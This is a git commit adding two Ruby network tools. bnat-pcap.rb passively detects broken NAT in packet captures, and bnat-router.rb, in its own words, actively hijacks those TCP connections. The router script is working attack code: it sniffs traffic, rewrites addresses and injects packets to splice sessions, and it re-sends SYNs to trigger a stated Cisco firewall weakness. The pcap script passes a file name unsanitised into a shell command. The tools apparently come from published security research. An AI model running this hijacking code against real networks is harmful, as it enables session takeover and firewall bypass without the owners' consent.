b0980b7aaf99508f20e071e9d1224d5108e8c345
claudijd <claudijd@yahoo.com>
2011-08-06 18:37:18 -0500

    added bnat-router & bnat-pcap code

---
+++ bnat-pcap.rb
@@ -0,0 +1,109 @@
+#!/usr/bin/env ruby
+# bnat-pcap - A tool to passively detect BNAT in static pcap files
+#
+# Copyright (c) 2011 Jonathan Claudius
+#
+# This program is free software: you can redistribute it and/or modify it
+# under the terms of the GNU General Public License as published by the
+# Free Software Foundation, either version 3 of the License, or (at your
+# option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+# or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
+# for more details.
+#
+# You should have received a copy of the GNU General Public License along
+# with this program. If not, see <http://www.gnu.org/licenses/>.
+#
+
+require 'examples'
+require 'packetfu'
+include PacketFu
+
+synack_hash = Hash.new
+synackarray = Array.new
+syn_hash = Hash.new
+synarray = Array.new
+
+puts "\nbnat-pcap.rb v0.2\n\n"
+
+def usage
+  puts "\nUsage: ruby ./bnat-pcap.rb <packetcapture>.pcap\n\n"
+  exit
+end
+
+if ARGV.length != 1 or not File.exist?(ARGV[0])
+  usage()
+end
+
+sample = ARGV[0]
+
+beginning = Time.now
+
+puts "\nParsing SYN/ACK data from PCAP..."
+system("tcpdump -nn -r #{sample} -w ./synack.pcap tcp[13] == 18")
+puts "Parsed SYN/ACK data from PCAP in #{Time.now - beginning} seconds"
+
+pcap = PcapFile.new.f2a( :f => "./synack.pcap", :filter => "tcp and tcp[13] == 18")
+
+puts "SYN/ACK PCAP Load time was #{Time.now - beginning} seconds"
+
+pcap.each do |pkt|
+  packet = PacketFu::Packet.parse(pkt)
+  synack_hash = { "ip" => packet.ip_saddr.to_s, "port" => packet.tcp_sport.to_s, "seq" => packet.tcp_ack.to_s}
+  synackarray.push(synack_hash)
+end
+
+synackarray = synackarray.uniq
+
+bpf = ""
+temp = ""
+temp2 = 0
+synackarray.each do |synack|
+  temp = synack["seq"]
+  temp2 = temp.to_i-1
+  if bpf == ""
+    bpf = "'tcp [4:4] == 0x"+temp2.to_s(16)+"'"
+  else
+    bpf = bpf+" or 'tcp [4:4] == 0x"+temp2.to_s(16)+"'"
+  end
+end
+
+puts "BPF: "+bpf
+
+puts "SYN/ACK PCAP Process time was #{Time.now - beginning} seconds"
+
+puts "\nParsing SYN data from PCAP..."
+system("tcpdump -nn -r #{sample} -w ./syn.pcap 'tcp[13] == 2' and #{bpf}")
+puts "Parsed SYN data from PCAP in #{Time.now - beginning} seconds"
+
+pcap2 = PcapFile.new.f2a(:f => './syn.pcap')
+
+puts "SYN PCAP Load time was #{Time.now - beginning} seconds"
+
+pcap2.each do |pkt|
+  packet = PacketFu::Packet.parse(pkt)
+  syn_hash = { "ip" => packet.ip_daddr.to_s, "port" => packet.tcp_dport.to_s, "seq" => packet.tcp_seq.to_s}
+  synarray.push(syn_hash)
+  #puts "[+]SYN:\t\t"+packet.ip_daddr.to_s+"\t"+packet.tcp_dport.to_s+"\t"+packet.tcp_seq.to_s
+end
+
+puts "SYN PCAP Process time was #{Time.now - beginning} seconds\n\n"
+
+synarray = synarray.uniq
+
+synackarray.each do |synackpacket|
+  synarray.each do |synpacket|
+    temp = synpacket["seq"]
+    temp2 = temp.to_i
+    seq = temp2+1
+    if synackpacket["ip"] != synpacket["ip"] and synackpacket["port"] == synpacket["port"] and synackpacket["seq"] == seq.to_s
+      puts "[+]BNAT DETECTED:\t Requested:"+synpacket["ip"]+":"+synpacket["port"]+"\t Responded:"+synackpacket["ip"]+":"+synackpacket["port"]+"\tSession:"+seq.to_s
+    end
+  end
+end
+
+puts "\nTime elapsed #{Time.now - beginning} seconds\n\n"
+
+system("rm syn.pcap synack.pcap")
---
+++ bnat-router.rb
@@ -0,0 +1,150 @@
+#!/usr/bin/env ruby
+# bnat-router - A tool to actively hijack TCP-based BNAT identified by bnat-scan/bnat-pcap
+#
+# Copyright (C) 2011 Jonathan Claudius
+#
+# This program is free software: you can redistribute it and/or modify it
+# under the terms of the GNU General Public License as published by the
+# Free Software Foundation, either version 3 of the License, or (at your
+# option) any later version.
+#
+# This program is distributed in the hope that it will be useful, but
+# WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
+# or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License
+# for more details.
+#
+# You should have received a copy of the GNU General Public License along
+# with this program. If not, see <http://www.gnu.org/licenses/>.
+#
+
+require 'rubygems'
+require 'packetfu'
+include PacketFu
+
+puts "\nbnat-router v0.1\n\n"
+
+inint = ARGV[0]
+outint = ARGV[2]
+clientip = ARGV[1]
+serverip = ARGV[3]
+bnatip = ARGV[4]
+
+##puts "inint #{inint}"
+##puts "outint #{outint}"
+##puts "bnatip #{bnatip}"
+##puts "clientip #{clientip}"
+##puts "serverip #{serverip}"
+
+def usage
+  puts "\nUsage: ruby bnat-router.rb <insideint> <clientip> <outsideint> <serverip> <bnatip>"
+  puts "Example: ruby bnat-router.rb eth1 192.168.3.2 eth0 1.1.2.1 1.1.2.2\n\n"
+  Process.exit
+end
+
+if ARGV.length != 5
+  usage
+end
+
+def arp(target_ip,int)
+  $config = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{int}").config
+  arp_pkt = PacketFu::ARPPacket.new(:flavor => "Windows")
+  arp_pkt.eth_saddr = arp_pkt.arp_saddr_mac = $config[:eth_saddr]
+  arp_pkt.eth_daddr = "ff:ff:ff:ff:ff:ff"
+  arp_pkt.arp_daddr_mac = "00:00:00:00:00:00"
+  arp_pkt.arp_saddr_ip = $config[:ip_saddr]
+  arp_pkt.arp_daddr_ip = target_ip
+  cap = PacketFu::Capture.new(:iface => $config[:iface], :start => true, :filter => "arp src #{target_ip} and ether dst #{arp_pkt.eth_saddr}")
+  injarp = PacketFu::Inject.new(:iface => $config[:iface])
+  injarp.a2w(:array => [arp_pkt.to_s])
+  target_mac = nil
+  while target_mac.nil?
+    if cap.save > 0
+      arp_response = PacketFu::Packet.parse(cap.array[0])
+      target_mac = arp_response.arp_saddr_mac if arp_response.arp_saddr_ip = target_ip
+    end
+    sleep 0.1 # Check for a response ten times per second.
+  end
+  #puts "#{target_ip} is-at #{target_mac}"
+  return target_mac
+end
+
+clientmac = arp(clientip,inint)
+puts "Obtained Client MAC: #{clientmac}"
+servermac = arp(serverip,outint)
+puts "Obtained Server MAC: #{servermac}"
+bnatmac = arp(bnatip,outint)
+puts "Obtained BNAT MAC: #{bnatmac}\n\n"
+
+#Create Interface Specific Configs
+outconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{outint}").config
+inconfig = PacketFu::Config.new(PacketFu::Utils.ifconfig ":#{inint}").config
+
+#Set Captures for Traffic coming from Outside and from Inside respectively
+outpcap = PacketFu::Capture.new( :config => "#{outint}", :start => true, :filter => "tcp and src #{bnatip}" )
+puts "Now listening on #{outint}..."
+inpcap = PacketFu::Capture.new( :iface => "#{inint}", :start => true, :filter => "tcp and src #{clientip} and dst #{serverip}" )
+puts "Now listening on #{inint}...\n\n"
+
+#Start Thread from Outside Processing
+fromout=Thread.new do
+  loop {
+    outpcap.stream.each {
+      |pkt| packet = PacketFu::Packet.parse(pkt)
+ 
+      #Build a shell packet that will never hit the wire as a hack to get desired mac's
+      shell_pkt = PacketFu::TCPPacket.new(:config=>inconfig, :timeout=> 0.1, :flavor=>"Windows")
+      shell_pkt.ip_daddr=clientip
+      shell_pkt.recalc
+
+      #Mangle Received Packet and Drop on the Wire
+      packet.ip_saddr=serverip
+      packet.ip_daddr=clientip
+      packet.eth_saddr=shell_pkt.eth_saddr
+      packet.eth_daddr=clientmac
+      packet.recalc
+      inj = PacketFu::Inject.new( :iface => "#{inint}", :config =>inconfig )
+      inj.a2w(:array => [packet.to_s])
+      puts "inpacket processed"
+    }
+  }
+end
+
+#Start Thread from Inside Processing
+fromin=Thread.new do
+  loop {
+    inpcap.stream.each {
+      |pkt| packet = PacketFu::Packet.parse(pkt)
+   
+      if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
+        packet.ip_daddr=serverip
+        packet.eth_daddr=servermac
+      else
+        packet.ip_daddr=bnatip
+        packet.eth_daddr=bnatmac
+      end
+      
+      #Build a shell packet that will never hit the wire as a hack to get desired mac's
+      shell_pkt = PacketFu::TCPPacket.new(:config=>outconfig, :timeout=> 0.1, :flavor=>"Windows")
+      shell_pkt.ip_daddr=serverip
+      shell_pkt.recalc
+
+      #Mangle Received Packet and Drop on the Wire
+      packet.eth_saddr=shell_pkt.eth_saddr
+      packet.recalc
+      inj = PacketFu::Inject.new( :iface => "#{outint}", :config =>outconfig )
+      inj.a2w(:array => [packet.to_s])
+      
+      #Trigger Cisco SPI Vulnerability by Double-tapping the SYN
+      if packet.tcp_flags.syn == 1 && packet.tcp_flags.ack == 0
+        sleep 0.75
+        inj.a2w(:array => [packet.to_s])
+      end
+
+      puts "outpacket processed"
+    }
+  }
+end
+
+#Hold Process Open
+fromout.join
+fromin.join
